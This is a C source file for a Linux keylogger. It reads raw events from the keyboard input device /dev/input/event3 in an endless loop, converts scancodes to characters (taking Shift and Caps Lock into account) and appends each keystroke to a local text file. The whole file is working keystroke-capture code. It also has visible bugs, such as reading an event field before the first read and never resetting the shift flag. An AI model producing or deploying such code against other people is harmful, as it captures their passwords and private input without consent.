/*************************************************************************
	> File Name: logkeys.c
	> Author: 
	> Mail: 
	> Created Time: 2017年11月03日 星期五 23时07分39秒
 ************************************************************************/

#include<stdio.h>
#include<linux/input.h>
#include<unistd.h>
#include<fcntl.h>
#include<stdlib.h>
#include"./global.c"

int main()
{
    FILE *fh = fopen("1.txt","a+");
    int shift_press = 0;
    int caps_press = 0;

    int fd;
    fd = open("/dev/input/event3",O_RDONLY);
    struct input_event ev;

    while(1)
    {
        int temp=ev.code;
        read(fd,&ev,sizeof(struct input_event));
        if(ev.code == 0 || ev.code==4 || ev.code == temp)
            continue;
        if(ev.value == 1)
        {
            if(ev.code == 58)
                caps_press = 1;
            else
                caps_press = 0;
        }
        if(ev.code == 42 || ev.code == 54)
            shift_press = 1;
/*
        fprintf(fh,"%d\n",(int)ev.code);
        fflush(fh);
*/
        if(shift_press)
        {
            fprintf(fh,"Key %s pressed.\n",shiftScancode2ascii[ev.code]);
            fflush(fh);
        }
        else if(caps_press)
        {
            fprintf(fh,"Key %s pressed.\n",capsScancode2ascii[ev.code]);
            fflush(fh);
        }
        else
        {
            fprintf(fh,"Key %s pressed.\n",scancode2ascii[ev.code]);
            fflush(fh);
        }
    }
}
